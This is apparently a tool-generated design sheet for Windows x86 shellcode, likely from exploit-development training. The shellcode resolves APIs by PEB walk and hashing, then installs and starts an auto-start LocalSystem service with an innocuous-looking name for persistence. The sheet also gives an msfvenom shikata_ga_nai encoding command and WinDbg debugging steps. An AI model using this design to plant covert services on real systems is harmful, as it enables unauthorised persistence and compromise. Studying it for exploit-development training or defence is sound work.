# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x200` (0x200 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | advapi32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | OpenSCManagerA | advapi32.dll |
| `[ebp-0x30]` | CreateServiceA | advapi32.dll |
| `[ebp-0x34]` | StartServiceA | advapi32.dll |
| `[ebp-0x38]` | CloseServiceHandle | advapi32.dll |
| `[ebp-0x3c]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x40]` | scm_handle | 4 |
| `[ebp-0x44]` | svc_handle | 4 |

## Structures

_No structures._

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x10c]` | service_name | UpdateSvc | 12 |
| `[ebp-0x118]` | dst_path | C:\dest.txt | 12 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| ExitProcess | `0x73e2d87e` | `[ebp-0x3c]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### ExitProcess

**Slot:** `[ebp-0x3c]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## advapi32.dll

Resolution: `LoadLibraryA("advapi32.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| OpenSCManagerA | `0xbe66d274` | `[ebp-0x2c]` | service |
| CreateServiceA | `0x9e112ad3` | `[ebp-0x30]` | service |
| StartServiceA | `0x8baf18e3` | `[ebp-0x34]` | service |
| CloseServiceHandle | `0xddb5b95c` | `[ebp-0x38]` | service |

### API Details

#### OpenSCManagerA

**Slot:** `[ebp-0x2c]`
**Hash:** `0xbe66d274`
**Module:** advapi32.dll
**Category:** service

```c
SC_HANDLE OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpMachineName | LPCSTR | NULL for local machine |
| 2 | lpDatabaseName | LPCSTR | NULL for SERVICES_ACTIVE_DATABASE |
| 3 | dwDesiredAccess | DWORD | SC_MANAGER_CREATE_SERVICE = 0x0002 |

---

#### CreateServiceA

**Slot:** `[ebp-0x30]`
**Hash:** `0x9e112ad3`
**Module:** advapi32.dll
**Category:** service

```c
SC_HANDLE CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hSCManager | SC_HANDLE | from OpenSCManagerA |
| 2 | lpServiceName | LPCSTR | internal service name |
| 3 | lpDisplayName | LPCSTR | display name (can match service name) |
| 4 | dwDesiredAccess | DWORD | SERVICE_ALL_ACCESS = 0xF01FF |
| 5 | dwServiceType | DWORD | SERVICE_WIN32_OWN_PROCESS = 0x10 |
| 6 | dwStartType | DWORD | SERVICE_AUTO_START = 0x02 |
| 7 | dwErrorControl | DWORD | SERVICE_ERROR_IGNORE = 0x00 |
| 8 | lpBinaryPathName | LPCSTR | path to service executable |
| 9 | lpLoadOrderGroup | LPCSTR | NULL |
| 10 | lpdwTagId | LPDWORD | NULL |
| 11 | lpDependencies | LPCSTR | NULL |
| 12 | lpServiceStartName | LPCSTR | NULL (LocalSystem) |
| 13 | lpPassword | LPCSTR | NULL |

---

#### StartServiceA

**Slot:** `[ebp-0x34]`
**Hash:** `0x8baf18e3`
**Module:** advapi32.dll
**Category:** service

```c
BOOL StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hService | SC_HANDLE | from CreateServiceA |
| 2 | dwNumServiceArgs | DWORD | 0 |
| 3 | lpServiceArgVectors | LPCSTR * | NULL |

---

#### CloseServiceHandle

**Slot:** `[ebp-0x38]`
**Hash:** `0xddb5b95c`
**Module:** advapi32.dll
**Category:** service

```c
BOOL CloseServiceHandle(SC_HANDLE hSCObject)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hSCObject | SC_HANDLE | SCM or service handle |

---

---

# Structure Layouts

---

# Operational Cheatsheet

**Template:** IRServicePersistTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Service name:**
```
UpdateSvc
```

**Binary path on target:**
```
C:\dest.txt
```

**Check status:**
```
sc query UpdateSvc
```

**Remove service:**
```
sc delete UpdateSvc
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; LoadLibraryA
dd ebp-0x2c L1    ; OpenSCManagerA
dd ebp-0x30 L1    ; CreateServiceA
dd ebp-0x34 L1    ; StartServiceA
dd ebp-0x38 L1    ; CloseServiceHandle
dd ebp-0x3c L1    ; ExitProcess
```

## Inspect Structures Before API Calls

## Inspect Stack Strings

```
da ebp-0x10c    ; service_name
```

```
da ebp-0x118    ; dst_path
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_OpenSCManagerA>
bp <sc_base>+<offset_of_call_CreateServiceA>
bp <sc_base>+<offset_of_call_StartServiceA>
bp <sc_base>+<offset_of_call_CloseServiceHandle>
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.